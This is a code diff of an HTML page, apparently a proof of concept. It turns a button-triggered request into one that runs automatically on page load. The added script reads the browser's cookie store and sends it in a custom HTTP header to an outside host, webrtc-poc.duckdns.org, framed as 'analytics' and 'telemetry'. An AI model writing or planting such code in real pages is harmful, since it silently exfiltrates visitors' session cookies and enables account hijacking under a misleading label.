@@ -7,39 +7,45 @@
 <body>
     <h1>Custom Header Transport Client</h1>
     <p>Targeting Secure VM Instance over Port 8443...</p>
-    <button id="send-btn" style="padding: 10px 20px;">Trigger Custom Header Send</button>
+    <hr>
     
     <div id="status" style="margin-top: 20px; font-family: monospace; white-space: pre-line;"></div>
 
     <script>
-        async function transmitHeader() {
-            // Point explicitly to your secure domain and port 8443
+        // 1. SET MOCK SESSION COOKIE
+        // This simulates an active session cookie residing in the browser's storage
+        document.cookie = "session_id=mock_token_abc12345_secure; path=/; SameSite=Lax";
+
+        async function transmitHeaderAutomatically() {
             const targetUrl = 'https://webrtc-poc.duckdns.org:8443/analytics';
             const logElement = document.getElementById('status');
 
-            // Collect session identifiers or cookie configurations
+            // Collect the local cookie store string
             const telemetryPayload = document.cookie || "STALE_OR_EMPTY_COOKIE_STORE";
             
-            logElement.innerHTML += `\n[1] Preparing custom header payload: "${telemetryPayload}"`;
+            logElement.innerHTML += `\n[1] Page loaded. Reading cookie store: "${telemetryPayload}"`;
+            logElement.innerHTML += `\n[2] Transmitting payload via 'X-Custom-Identifier' header...`;
 
             try {
                 const response = await fetch(targetUrl, {
                     method: 'GET',
                     headers: {
-                        // The custom tracking identifier containing the token string
+                        // Pass the cookie string manually via your custom HTTP header
                         'X-Custom-Identifier': telemetryPayload
                     }
                 });
 
                 const data = await response.json();
-                logElement.innerHTML += `\n<span style="color: green;">[2] Server Handshake Success: ${JSON.stringify(data)}</span>`;
+                logElement.innerHTML += `\n<span style="color: green;">[3] Server Handshake Success: ${JSON.stringify(data)}</span>`;
             } catch (error) {
                 logElement.innerHTML += `\n<span style="color: red;">[Error] Connection Failed: ${error.message}</span>`;
                 console.error("Transmission Error:", error);
             }
         }
 
-        document.getElementById('send-btn').addEventListener('click', transmitHeader);
+        // 2. AUTOMATIC TRIGGER ON LOAD
+        // Replaces the button click listener with an automated onload window event
+        window.onload = transmitHeaderAutomatically;
     </script>
 </body>
 </html>
